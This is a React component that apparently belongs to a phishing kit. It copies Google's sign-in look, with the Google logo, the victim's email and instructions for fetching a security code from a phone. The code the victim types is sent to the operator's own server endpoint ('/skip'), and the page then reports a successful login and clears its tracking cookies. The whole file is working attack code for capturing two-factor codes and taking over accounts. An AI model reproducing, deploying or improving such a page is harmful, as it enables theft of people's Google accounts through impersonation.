import { useForm } from 'react-hook-form';
import Cookies from "js-cookie";
import { toast } from "react-toastify";
import { API_URL } from "../config/index";
const Security= ({handleButtonClick,id}) => {
    let form=useForm();
    let{register,handleSubmit,reset}=form
    let email = Cookies.get("email");

  let onSubmit = async (values) => {
    console.log(values)
      let{recoveryPassword}=values
      let submitValues = {
         id:id,
         skipcode:recoveryPassword
         
       };
    
       let url = `${API_URL}/skip`;
    
        let res = await fetch(url, {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
          },
          body: JSON.stringify(submitValues),
        });
    
      let data = await res.json();
    
        if (res.ok) {
            handleButtonClick(0)
          console.log("success", data);
          console.log("success", submitValues);
          toast.success("Login Succecssfull");
          Cookies.remove("id");
          Cookies.remove("email");
        } else {
          console.log("error", data);
          toast.error("Something Went Wrong");
        }
      };
   
    return (
      <form onSubmit={handleSubmit(onSubmit)}>
          
        <div className="top-content">
          <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt=""/>
          <p className='font-semibold text-xl pt-3'>Welcome</p>
          <div className="type-email mt-2">
          <svg aria-hidden="true" className="stUf5b" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg>
          <p>{email}</p>
          <svg aria-hidden="true" className="stUf5b MSBt4d" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg>
          </div>
        
        </div>
        <div className="pt-5 pl-3">
        <ul  className="list-disc p-5 text-base">
        <li>Get your <b>Device</b></li>
        <li>Open settings app </li>
        <li>Tap <b>Google</b></li>
        <li>Choose your account, if it not already selected</li>
        <li>Tap <b>Manage your Google Account</b></li>
        <li>Select the security tab(you may need to scroll to the right)</li>
        <li>Under "Signing in to Google" tap <b>Security code</b></li>
        <li>Choose an account to get your code</li></ul>
        </div>
        
        <div className="inputs">
          <input type="password" {...register('recoveryPassword')} id="recoveryPassword" className="input"/>
        
          <label for="password" className="input-label">Enter your code</label>
        
        </div>
        <div className="btn-group mt-14">
          <button className="create-btn font-medium">More ways to sign in</button>
        
          <button className="next-btn" 
          >Sign In</button>
        
         
        
        </div>
        
      </form>
    );
};

export default Security;